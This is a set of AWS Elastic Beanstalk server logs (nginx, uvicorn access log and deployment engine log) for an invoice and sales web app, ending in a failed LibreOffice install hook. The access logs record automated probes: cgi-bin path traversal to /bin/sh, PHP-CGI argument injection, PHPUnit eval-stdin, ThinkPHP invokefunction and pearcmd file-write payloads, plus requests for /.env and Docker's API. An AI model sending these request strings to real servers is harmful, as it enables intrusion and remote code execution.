+2026/04/23 06:57:03 [warn] 64999#64999: *124 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/6/01/0000000016 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:57:11 [warn] 64999#64999: *118 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/7/01/0000000017 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:58:07 [warn] 64999#64999: *128 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/8/01/0000000018 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:58:20 [warn] 64999#64999: *128 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/9/01/0000000019 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:59:41 [warn] 64999#64999: *134 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/0/02/0000000020 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/ublox/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/ublox/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:59:44 [warn] 64999#64999: *136 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/1/02/0000000021 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 06:59:48 [warn] 64999#64999: *134 an upstream response is buffered to a temporary file /var/lib/nginx/tmp/proxy/2/02/0000000022 while reading upstream, client: 222.107.157.9, server: , request: "GET /api/auo/data HTTP/1.1", upstream: "http://127.0.0.1:8000/api/auo/data", host: "microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com", referrer: "http://microchip-matching-prod.eba-p2zrvmuk.ap-northeast-2.elasticbeanstalk.com/"
+2026/04/23 07:01:10 [warn] 64999#64999: *141 using uninitialized "year" variable while logging request, client: 115.191.32.57, server: , request: "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
+2026/04/23 07:01:10 [warn] 64999#64999: *141 using uninitialized "month" variable while logging request, client: 115.191.32.57, server: , request: "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
+2026/04/23 07:01:10 [warn] 64999#64999: *141 using uninitialized "day" variable while logging request, client: 115.191.32.57, server: , request: "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
+2026/04/23 07:01:10 [warn] 64999#64999: *141 using uninitialized "hour" variable while logging request, client: 115.191.32.57, server: , request: "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"
+2026/04/23 07:01:12 [warn] 64999#64999: *142 using uninitialized "year" variable while logging request, client: 115.191.32.57, server: , request: "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"
+2026/04/23 07:01:12 [warn] 64999#64999: *142 using uninitialized "month" variable while logging request, client: 115.191.32.57, server: , request: "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"
+2026/04/23 07:01:12 [warn] 64999#64999: *142 using uninitialized "day" variable while logging request, client: 115.191.32.57, server: , request: "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"
+2026/04/23 07:01:12 [warn] 64999#64999: *142 using uninitialized "hour" variable while logging request, client: 115.191.32.57, server: , request: "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"
+
+
+----------------------------------------
+/var/log/web.stdout.log
+----------------------------------------
+Apr 23 06:27:28 ip-172-31-7-177 web[64958]: INFO:     35.195.99.33:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 06:28:40 ip-172-31-7-177 web[64958]: INFO:     166.88.169.176:0 - "GET /.env HTTP/1.1" 200 OK
+Apr 23 06:28:41 ip-172-31-7-177 web[64958]: INFO:     166.88.169.176:0 - "POST / HTTP/1.1" 405 Method Not Allowed
+Apr 23 06:34:45 ip-172-31-7-177 web[64958]: INFO:     204.76.203.206:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 06:41:44 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 06:41:44 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /static/js/main.2144f5b6.js HTTP/1.1" 200 OK
+Apr 23 06:41:44 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /static/css/main.e2a7b3c1.css HTTP/1.1" 200 OK
+Apr 23 06:41:44 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /manifest.json HTTP/1.1" 200 OK
+Apr 23 06:42:02 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "POST /api/invoice-batch/preview HTTP/1.1" 200 OK
+Apr 23 06:42:41 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "POST /api/invoice/generate HTTP/1.1" 200 OK
+Apr 23 06:43:05 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/exchange-rate HTTP/1.1" 200 OK
+Apr 23 06:43:05 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/sales/data HTTP/1.1" 200 OK
+Apr 23 06:43:06 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:43:06 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/exchange-rate HTTP/1.1" 200 OK
+Apr 23 06:44:35 ip-172-31-7-177 web[64958]: INFO:     204.76.203.206:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 06:47:01 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/sales/data HTTP/1.1" 200 OK
+Apr 23 06:47:22 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "POST /api/invoice-batch/preview HTTP/1.1" 200 OK
+Apr 23 06:47:27 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:47:30 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:48:38 ip-172-31-7-177 web[64958]: INFO:     27.0.238.70:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 06:50:26 ip-172-31-7-177 web[64958]: INFO:     59.9.178.113:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 06:50:26 ip-172-31-7-177 web[64958]: INFO:     59.9.178.113:0 - "GET /static/css/main.e2a7b3c1.css HTTP/1.1" 200 OK
+Apr 23 06:50:26 ip-172-31-7-177 web[64958]: INFO:     59.9.178.113:0 - "GET /static/js/main.2144f5b6.js HTTP/1.1" 200 OK
+Apr 23 06:50:26 ip-172-31-7-177 web[64958]: INFO:     59.9.178.113:0 - "GET /manifest.json HTTP/1.1" 200 OK
+Apr 23 06:50:27 ip-172-31-7-177 web[64958]: INFO:     59.9.178.113:0 - "GET /favicon.ico HTTP/1.1" 200 OK
+Apr 23 06:50:39 ip-172-31-7-177 web[64958]: INFO:     59.9.178.113:0 - "GET /api/ublox/data HTTP/1.1" 200 OK
+Apr 23 06:50:45 ip-172-31-7-177 web[64958]: INFO:     59.9.178.113:0 - "GET /api/sales/data HTTP/1.1" 200 OK
+Apr 23 06:50:51 ip-172-31-7-177 web[64958]: INFO:     59.9.178.113:0 - "GET /api/exchange-rate HTTP/1.1" 200 OK
+Apr 23 06:51:24 ip-172-31-7-177 web[64958]: INFO:     59.9.178.113:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:51:56 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 06:51:56 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /static/js/main.2144f5b6.js HTTP/1.1" 200 OK
+Apr 23 06:51:56 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /static/css/main.e2a7b3c1.css HTTP/1.1" 200 OK
+Apr 23 06:51:56 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /manifest.json HTTP/1.1" 200 OK
+Apr 23 06:52:13 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/exchange-rate HTTP/1.1" 200 OK
+Apr 23 06:53:00 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 06:53:00 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /static/css/main.e2a7b3c1.css HTTP/1.1" 304 Not Modified
+Apr 23 06:53:00 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /static/js/main.2144f5b6.js HTTP/1.1" 304 Not Modified
+Apr 23 06:53:00 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /manifest.json HTTP/1.1" 200 OK
+Apr 23 06:53:17 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "POST /api/invoice-batch/preview HTTP/1.1" 200 OK
+Apr 23 06:53:38 ip-172-31-7-177 web[64958]: INFO:     204.76.203.206:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 06:53:54 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/sales/data HTTP/1.1" 200 OK
+Apr 23 06:56:33 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:56:33 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/exchange-rate HTTP/1.1" 200 OK
+Apr 23 06:56:37 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/sales/data HTTP/1.1" 200 OK
+Apr 23 06:56:38 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/exchange-rate HTTP/1.1" 200 OK
+Apr 23 06:57:03 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:57:11 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:57:11 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/exchange-rate HTTP/1.1" 200 OK
+Apr 23 06:58:07 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:58:09 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/exchange-rate HTTP/1.1" 200 OK
+Apr 23 06:58:20 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:58:41 ip-172-31-7-177 web[64958]: WARNING:  Invalid HTTP request received.
+Apr 23 06:59:41 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/ublox/data HTTP/1.1" 200 OK
+Apr 23 06:59:44 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 06:59:48 ip-172-31-7-177 web[64958]: INFO:     222.107.157.9:0 - "GET /api/auo/data HTTP/1.1" 200 OK
+Apr 23 07:00:31 ip-172-31-7-177 web[64958]: INFO:     204.76.203.206:0 - "GET / HTTP/1.1" 200 OK
+Apr 23 07:01:26 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 405 Method Not Allowed
+Apr 23 07:01:27 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 405 Method Not Allowed
+Apr 23 07:01:27 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:27 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:27 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:28 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:28 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:28 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:28 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:29 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:29 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:29 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:29 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:29 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:29 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:29 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:30 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:30 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:30 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:30 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:30 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:30 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:31 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:31 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:31 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:32 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:32 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:32 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:33 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:33 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:33 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:33 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:33 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:34 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:34 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:34 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:34 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:35 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:35 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 OK
+Apr 23 07:01:35 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 200 OK
+Apr 23 07:01:35 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 200 OK
+Apr 23 07:01:35 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1" 200 OK
+Apr 23 07:01:36 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 200 OK
+Apr 23 07:01:36 ip-172-31-7-177 web[64958]: INFO:     115.191.32.57:0 - "GET /containers/json HTTP/1.1" 200 OK
+
+
+----------------------------------------
+/var/log/eb-engine.log
+----------------------------------------
+2026/04/23 05:47:30.927406 [INFO] Running command: systemctl show -p PartOf nginx.service
+2026/04/23 05:47:30.939578 [INFO] Running command: systemctl is-active nginx.service
+2026/04/23 05:47:30.947422 [INFO] Running command: systemctl start nginx.service
+2026/04/23 05:47:31.079063 [INFO] Executing instruction: configureSqsd
+2026/04/23 05:47:31.079082 [INFO] This is a web server environment instance, skip configure sqsd daemon ...
+2026/04/23 05:47:31.079097 [INFO] Executing instruction: startSqsd
+2026/04/23 05:47:31.079100 [INFO] This is a web server environment instance, skip start sqsd daemon ...
+2026/04/23 05:47:31.079104 [INFO] Executing instruction: Track pids in healthd
+2026/04/23 05:47:31.079107 [INFO] This is an enhanced health env...
+2026/04/23 05:47:31.079120 [INFO] Running command: systemctl show -p ConsistsOf aws-eb.target | cut -d= -f2
+2026/04/23 05:47:31.089523 [INFO] cfn-hup.service healthd.service nginx.service
+
+2026/04/23 05:47:31.089555 [INFO] Running command: systemctl show -p ConsistsOf eb-app.target | cut -d= -f2
+2026/04/23 05:47:31.099350 [INFO] web.service
+
+2026/04/23 05:47:31.099617 [INFO] Executing instruction: RunAppDeployPostDeployHooks
+2026/04/23 05:47:31.099629 [INFO] No hooks found in .platform/hooks/postdeploy/, skipping
+2026/04/23 05:47:31.099632 [INFO] Executing cleanup logic
+2026/04/23 05:47:31.099717 [INFO] CommandService Response: {"status":"SUCCESS","api_version":"1.0","results":[{"status":"SUCCESS","msg":"Engine execution has succeeded.","returncode":0,"events":[{"msg":"Instance deployment used the commands in your 'Procfile' to initiate startup of your application.","timestamp":1776923243079,"severity":"INFO"},{"msg":"Instance deployment completed successfully.","timestamp":1776923251099,"severity":"INFO"}]}]}
+
+2026/04/23 05:47:31.128166 [INFO] Platform Engine finished execution on command: app-deploy
+
+2026/04/23 07:00:32.206736 [INFO] Starting...
+2026/04/23 07:00:32.206870 [INFO] Starting EBPlatform-PlatformEngine
+2026/04/23 07:00:32.206944 [INFO] reading event message file
+2026/04/23 07:00:32.207325 [INFO] Engine received EB command cfn-hup-exec
+
+2026/04/23 07:00:32.305237 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:ap-northeast-2:376798132745:stack/awseb-e-jtq2v3kzrt-stack/924a2a30-3df2-11f1-916c-06bc62a629a9 -r AWSEBAutoScalingGroup --region ap-northeast-2
+2026/04/23 07:00:32.609832 [INFO] Running command: /opt/aws/bin/cfn-get-metadata -s arn:aws:cloudformation:ap-northeast-2:376798132745:stack/awseb-e-jtq2v3kzrt-stack/924a2a30-3df2-11f1-916c-06bc62a629a9 -r AWSEBBeanstalkMetadata --region ap-northeast-2
+2026/04/23 07:00:32.928896 [INFO] checking whether command app-deploy is applicable to this instance...
+2026/04/23 07:00:32.928911 [INFO] this command is applicable to the instance, thus instance should execute command
+2026/04/23 07:00:32.928915 [INFO] Setting up deployment log with request ID: ce9c4144-48f3-436c-b3ab-53818ae92ef1
+2026/04/23 07:00:32.988048 [INFO] Started S3 deployment log upload to s3://elasticbeanstalk-ap-northeast-2-376798132745/resources/environments/logs/deployments/e-jtq2v3kzrt/eb-deployment-ce9c4144-48f3-436c-b3ab-53818ae92ef1.log
+2026/04/23 07:00:32.988160 [INFO] Engine command: (app-deploy)
+
+2026/04/23 07:00:32.988164 [INFO] Downloading EB Application...
+2026/04/23 07:00:32.988166 [INFO] Region: ap-northeast-2
+2026/04/23 07:00:32.988168 [INFO] envID: e-jtq2v3kzrt
+2026/04/23 07:00:32.988171 [INFO] envBucket: elasticbeanstalk-ap-northeast-2-376798132745
+2026/04/23 07:00:32.988173 [INFO] accountID: 376798132745
+2026/04/23 07:00:32.988175 [INFO] Using manifest file name from command request
+2026/04/23 07:00:32.988185 [INFO] Manifest name is : manifest_1776927629619
+2026/04/23 07:00:32.988194 [INFO] Download app version manifest
+2026/04/23 07:00:32.988388 [INFO] Downloading: bucket: elasticbeanstalk-ap-northeast-2-376798132745, object: resources/environments/e-jtq2v3kzrt/_runtime/versions/manifest_1776927629619, expected bucket owner: 376798132745
+2026/04/23 07:00:33.035424 [INFO] Download successful92bytes downloaded
+2026/04/23 07:00:33.035574 [INFO] Trying to read and parse version manifest...
+2026/04/23 07:00:33.035685 [INFO] Downloading: bucket: elasticbeanstalk-ap-northeast-2-376798132745, object: resources/environments/e-jtq2v3kzrt/_runtime/_versions/microchip-matching/v23, expected bucket owner: 376798132745
+2026/04/23 07:00:33.059843 [INFO] Download successful525569bytes downloaded
+2026/04/23 07:00:33.060208 [INFO] Executing instruction: ElectLeader
+2026/04/23 07:00:33.060215 [INFO] Running leader election for instance i-0c3eb53082878133d...
+2026/04/23 07:00:33.060217 [INFO] Calling the cfn-elect-cmd-leader to elect the command leader.
+2026/04/23 07:00:33.060231 [INFO] Running command: /opt/aws/bin/cfn-elect-cmd-leader --stack arn:aws:cloudformation:ap-northeast-2:376798132745:stack/awseb-e-jtq2v3kzrt-stack/924a2a30-3df2-11f1-916c-06bc62a629a9 --command-name ElasticBeanstalkCommand-AWSEBAutoScalingGroup --invocation-id 4e8fc3c0-0aeb-4117-bc7c-be71419c61eb --listener-id i-0c3eb53082878133d --region ap-northeast-2
+2026/04/23 07:00:33.387523 [INFO] Instance is Leader.
+2026/04/23 07:00:33.387586 [INFO] Executing instruction: stopSqsd
+2026/04/23 07:00:33.387592 [INFO] This is a web server environment instance, skip stop sqsd daemon ...
+2026/04/23 07:00:33.387596 [INFO] Executing instruction: PreBuildEbExtension
+2026/04/23 07:00:33.387641 [INFO] Starting executing the config set Infra-EmbeddedPreBuild.
+2026/04/23 07:00:33.387656 [INFO] Running command: /opt/aws/bin/cfn-init -s arn:aws:cloudformation:ap-northeast-2:376798132745:stack/awseb-e-jtq2v3kzrt-stack/924a2a30-3df2-11f1-916c-06bc62a629a9 -r AWSEBAutoScalingGroup --region ap-northeast-2 --configsets Infra-EmbeddedPreBuild
+2026/04/23 07:00:33.714383 [INFO] Finished executing the config set Infra-EmbeddedPreBuild.
+
+2026/04/23 07:00:33.714456 [INFO] Executing instruction: StageApplication
+2026/04/23 07:00:33.714459 [INFO] Recreating /var/app/staging/
+2026/04/23 07:00:33.714546 [INFO] extracting /opt/elasticbeanstalk/deployment/app_source_bundle to /var/app/staging/
+2026/04/23 07:00:33.714558 [INFO] Running command: /usr/bin/unzip -q -o /opt/elasticbeanstalk/deployment/app_source_bundle -d /var/app/staging/
+2026/04/23 07:00:33.731615 [INFO] finished extracting /opt/elasticbeanstalk/deployment/app_source_bundle to /var/app/staging/ successfully
+2026/04/23 07:00:33.732473 [INFO] Executing instruction: RunAppDeployPreBuildHooks
+2026/04/23 07:00:33.732639 [INFO] Executing platform hooks in .platform/hooks/prebuild/
+2026/04/23 07:00:33.732687 [INFO] Following scripts will be executed in order: [01_libreoffice.sh]
+2026/04/23 07:00:33.732692 [INFO] Try add execution permission
+2026/04/23 07:00:33.732700 [INFO] Adding execute mode to file, original mode is 420
+2026/04/23 07:00:33.732718 [INFO] Running command: file -b /var/app/staging/.platform/hooks/prebuild/01_libreoffice.sh
+2026/04/23 07:00:33.762337 [INFO] Bourne-Again shell script, ASCII text executable
+
+2026/04/23 07:00:33.762359 [INFO] Running script: .platform/hooks/prebuild/01_libreoffice.sh
+2026/04/23 07:00:35.634720 [ERROR] An error occurred during execution of command [app-deploy] - [RunAppDeployPreBuildHooks]. Stop running the command. Error: Command .platform/hooks/prebuild/01_libreoffice.sh failed with error exit status 1. Stderr:Error: Unable to find a match: libreoffice
+ 
+
